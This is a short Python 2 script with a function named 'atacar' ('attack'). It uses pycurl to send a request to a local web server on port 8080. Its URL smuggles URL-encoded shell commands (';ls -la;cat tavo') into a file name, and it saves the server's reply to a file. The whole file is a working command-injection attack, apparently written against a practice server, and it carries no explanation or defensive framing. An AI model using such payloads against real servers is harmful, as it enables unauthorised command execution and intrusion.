#!/usr/bin/env python

import pycurl

def atacar():
	fp = open("ataque.txt", "wb")
	curl = pycurl.Curl()
	curl.setopt(pycurl.URL, "localhost:8080/tavo.txt%3Bls%20-la%3Bcat%20tavo")
	curl.setopt(pycurl.WRITEDATA, fp)
	curl.perform()
	curl.close()
	fp.close()
	print "\n= )\n"
	
def main():
	atacar()

if __name__ == "__main__":
	main()